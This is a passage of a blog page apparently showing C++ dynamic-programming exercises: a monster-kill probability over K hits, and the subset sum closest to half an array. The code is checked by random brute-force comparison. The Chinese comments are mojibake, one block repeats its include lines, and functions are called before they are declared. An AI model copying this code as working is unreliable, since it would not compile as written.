class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æ€ªç‰©Næ»´è¡€ï¼Œè‹±é›„æ”»å‡»åœ¨[0~M]ï¼Œkæ¬¡åå‡»æ€æ€ªç‰©çš„æ¦‚ç‡</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// è®¡ç®—å³è¾¹çš„ç”Ÿå­˜æ¦‚ç‡</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">1</span> || M &lt; <span class="hljs-number">1</span> || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">long</span> all = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, K); <span class="hljs-comment">// æ€»çš„ç æ³•æ•°</span><br>    <span class="hljs-type">long</span> kill = process(K, M, N); <span class="hljs-comment">// ç æ­»æ€ªå…½çš„æ–¹å¼æ•°</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>)kill / (<span class="hljs-type">double</span>)all;<br>&#125;<br><br><span class="hljs-comment">// é€’å½’å¤„ç†å‡½æ•°ï¼Œè®¡ç®—ç æ­»æ€ªå…½çš„æƒ…å†µæ•°</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">int</span> times, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> hp)</span> &#123;<br>    <span class="hljs-keyword">if</span> (times == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> hp &lt;= <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>; <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å‰©ä½™æ­¥æ•°ï¼Œä¸”æ€ªå…½è¡€é‡&lt;=0ï¼Œè¿”å›1</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (hp &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times); <span class="hljs-comment">// å¦‚æœè¡€é‡&lt;=0ï¼Œåˆ™æœ‰ 4^times ç§æ–¹å¼</span><br>    &#125;<br>    <span class="hljs-type">long</span> ways = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= M; i++) &#123;<br>        ways += process(times - <span class="hljs-number">1</span>, M, hp - i); <span class="hljs-comment">// éå†æ‰€æœ‰ä¼¤å®³æƒ…å†µ</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ways;<br>&#125;<br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’è§£æ³•1ï¼Œè®¡ç®—ç æ­»æ€ªå…½çš„æƒ…å†µæ•°</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">dp1</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">1</span> || M &lt; <span class="hljs-number">1</span> || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">long</span> all = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, K); <span class="hljs-comment">// æ€»çš„ç æ³•æ•°</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt; dp(K + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;(N + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> times = <span class="hljs-number">1</span>; times &lt;= K; times++) &#123;<br>        dp[times][<span class="hljs-number">0</span>] = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times); <span class="hljs-comment">// åˆå§‹æƒ…å†µä¸‹ï¼Œè¡€é‡ä¸º0ï¼Œæ‰€æœ‰çš„æ­¥æ•°éƒ½èƒ½ç æ­»</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> hp = <span class="hljs-number">1</span>; hp &lt;= N; hp++) &#123;<br>            <span class="hljs-type">long</span> ways = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= M; i++) &#123;<br>                <span class="hljs-keyword">if</span> (hp - i &gt;= <span class="hljs-number">0</span>) &#123;<br>                    ways += dp[times - <span class="hljs-number">1</span>][hp - i]; <span class="hljs-comment">// ä»å‰ä¸€çŠ¶æ€è¿ç§»</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    ways += <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times - <span class="hljs-number">1</span>); <span class="hljs-comment">// å¦‚æœè¡€é‡ä¸ºè´Ÿï¼Œåˆ™æ¯æ­¥æœ‰ (M+1) ç§æƒ…å†µ</span><br>                &#125;<br>            &#125;<br>            dp[times][hp] = ways;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">long</span> kill = dp[K][N];<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>)kill / (<span class="hljs-type">double</span>)all;<br>&#125;<br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’è§£æ³•2ï¼Œè®¡ç®—ç æ­»æ€ªå…½çš„æƒ…å†µæ•°</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">dp2</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">1</span> || M &lt; <span class="hljs-number">1</span> || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">long</span> all = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, K); <span class="hljs-comment">// æ€»çš„ç æ³•æ•°</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt; dp(K + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;(N + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> times = <span class="hljs-number">1</span>; times &lt;= K; times++) &#123;<br>        dp[times][<span class="hljs-number">0</span>] = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times); <span class="hljs-comment">// åˆå§‹æƒ…å†µä¸‹ï¼Œè¡€é‡ä¸º0ï¼Œæ‰€æœ‰çš„æ­¥æ•°éƒ½èƒ½ç æ­»</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> hp = <span class="hljs-number">1</span>; hp &lt;= N; hp++) &#123;<br>            dp[times][hp] = dp[times][hp - <span class="hljs-number">1</span>] + dp[times - <span class="hljs-number">1</span>][hp]; <span class="hljs-comment">// å½“å‰æ­¥æ•°ä¸‹çš„è¡€é‡çŠ¶æ€</span><br><br>            <span class="hljs-comment">// æ’é™¤éæ³•æƒ…å†µï¼Œç¡®ä¿è¡€é‡ä¸å°äº0</span><br>            <span class="hljs-keyword">if</span> (hp - <span class="hljs-number">1</span> - M &gt;= <span class="hljs-number">0</span>) &#123;<br>                dp[times][hp] -= dp[times - <span class="hljs-number">1</span>][hp - <span class="hljs-number">1</span> - M]; <span class="hljs-comment">// æ’é™¤æ‰é‚£äº›ä¸å¯èƒ½çš„æƒ…å†µ</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dp[times][hp] -= <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times - <span class="hljs-number">1</span>); <span class="hljs-comment">// è¡€é‡å°äº0æ—¶ï¼Œè·³è¿‡</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">long</span> kill = dp[K][N];<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>)kill / (<span class="hljs-type">double</span>)all;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> NMax = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> MMax = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> KMax = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">200</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•å¼€å§‹&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> N = rand() % NMax;<br>        <span class="hljs-type">int</span> M = rand() % MMax;<br>        <span class="hljs-type">int</span> K = rand() % KMax;<br>        <span class="hljs-type">double</span> ans1 = right(N, M, K);<br>        <span class="hljs-type">double</span> ans2 = dp1(N, M, K);<br>        <span class="hljs-type">double</span> ans3 = dp2(N, M, K);<br>        <span class="hljs-keyword">if</span> (ans1 != ans2 || ans1 != ans3) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•ç»“æŸ&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç»„æˆé’±çš„æœ€å°å¼ æ•°"><a href="#ç»„æˆé’±çš„æœ€å°å¼ æ•°" class="headerlink" title="ç»„æˆé’±çš„æœ€å°å¼ æ•°"></a>ç»„æˆé’±çš„æœ€å°å¼ æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><h4 id="è¿”å›æœ€æ¥è¿‘çš„ä¸¤ä¸ªé›†åˆé‡Œè¾ƒå°çš„ç´¯åŠ å’Œ"><a href="#è¿”å›æœ€æ¥è¿‘çš„ä¸¤ä¸ªé›†åˆé‡Œè¾ƒå°çš„ç´¯åŠ å’Œ" class="headerlink" title="è¿”å›æœ€æ¥è¿‘çš„ä¸¤ä¸ªé›†åˆé‡Œè¾ƒå°çš„ç´¯åŠ å’Œ"></a>è¿”å›æœ€æ¥è¿‘çš„ä¸¤ä¸ªé›†åˆé‡Œè¾ƒå°çš„ç´¯åŠ å’Œ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// é€’å½’è§£æ³•</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.size() &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    <span class="hljs-keyword">return</span> process(arr, <span class="hljs-number">0</span>, sum / <span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-comment">// é€’å½’</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == arr.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// è¿˜æœ‰æ•°ï¼Œarr[i]è¿™ä¸ªæ•°</span><br>        <span class="hljs-comment">// å¯èƒ½æ€§1ï¼Œä¸ä½¿ç”¨arr[i]</span><br>        <span class="hljs-type">int</span> p1 = process(arr, i + <span class="hljs-number">1</span>, rest);<br>        <span class="hljs-comment">// å¯èƒ½æ€§2ï¼Œè¦ä½¿ç”¨arr[i]</span><br>        <span class="hljs-type">int</span> p2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (arr[i] &lt;= rest) &#123;<br>            p2 = arr[i] + process(arr, i + <span class="hljs-number">1</span>, rest - arr[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> max(p1, p2);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’è§£æ³•</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.size() &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    sum /= <span class="hljs-number">2</span>;<br>    <br>    <span class="hljs-type">int</span> N = arr.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(sum + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = N - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= sum; rest++) &#123;<br>            <span class="hljs-comment">// å¯èƒ½æ€§1ï¼Œä¸ä½¿ç”¨arr[i]</span><br>            <span class="hljs-type">int</span> p1 = dp[i + <span class="hljs-number">1</span>][rest];<br>            <span class="hljs-comment">// å¯èƒ½æ€§2ï¼Œè¦ä½¿ç”¨arr[i]</span><br>            <span class="hljs-type">int</span> p2 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span> (arr[i] &lt;= rest) &#123;<br>                p2 = arr[i] + dp[i + <span class="hljs-number">1</span>][rest - arr[i]];<br>            &#125;<br>            dp[i][rest] = max(p1, p2);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][sum];<br>&#125;<br><br><span class="hljs-comment">// ç”Ÿæˆéšæœºæ•°ç»„</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">randomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> len, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(len)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        arr[i] = rand() % value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°æ•°ç»„</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>)); <span class="hljs-comment">// åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨</span><br><br>    <span class="hljs-type">int</span> maxLen = <span class="hljs-number">20</span>;<br>    <span class="hljs-type">int</span> maxValue = <span class="hljs-number">50</span>;<br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">10000</span>;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•å¼€å§‹&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> len = rand() % maxLen;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = randomArray(len, maxValue);<br>        <br>        <span class="hljs-type">int</span> ans1 = right(arr);<br>        <span class="hljs-type">int</span> ans2 = dp(arr);<br>        <br>        <span class="hljs-keyword">if</span> (ans1 != ans2) &#123;<br>            printArray(arr);<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æ­£ç¡®çš„ç­”æ¡ˆ: &quot;</span> &lt;&lt; ans1 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;åŠ¨æ€è§„åˆ’çš„ç­”æ¡ˆ: &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•ç»“æŸ&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="è¿”å›æœ€æ¥è¿‘çš„ä¸¤ä¸ªé›†åˆé‡Œè¾ƒå°çš„ç´¯åŠ å’Œï¼ˆé™åˆ¶é•¿åº¦ï¼‰"><a href="#è¿”å›æœ€æ¥è¿‘çš„ä¸¤ä¸ªé›†åˆé‡Œè¾ƒå°çš„ç´¯åŠ å’Œï¼ˆé™åˆ¶é•¿åº¦ï¼‰" class="headerlink" title="è¿”å›æœ€æ¥è¿‘çš„ä¸¤ä¸ªé›†åˆé‡Œè¾ƒå°çš„ç´¯åŠ å’Œï¼ˆé™åˆ¶é•¿åº¦ï¼‰"></a>è¿”å›æœ€æ¥è¿‘çš„ä¸¤ä¸ªé›†åˆé‡Œè¾ƒå°çš„ç´¯åŠ å’Œï¼ˆé™åˆ¶é•¿åº¦ï¼‰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// é€’å½’å‡½æ•°ï¼šé€‰æ‹©å­æ•°ç»„çš„å…ƒç´ ï¼Œä½¿å¾—æ€»å’Œå°½é‡æ¥è¿‘restä½†ä¸è¶…è¿‡rest</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> picks, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == arr.size()) &#123;  <span class="hljs-comment">// å¦‚æœæ‰€æœ‰å…ƒç´ éƒ½éå†å®Œäº†</span><br>        <span class="hljs-comment">// åˆ¤æ–­å½“å‰æŒ‘é€‰çš„å…ƒç´ æ•°é‡æ˜¯å¦ç¬¦åˆæ¡ä»¶</span><br>        <span 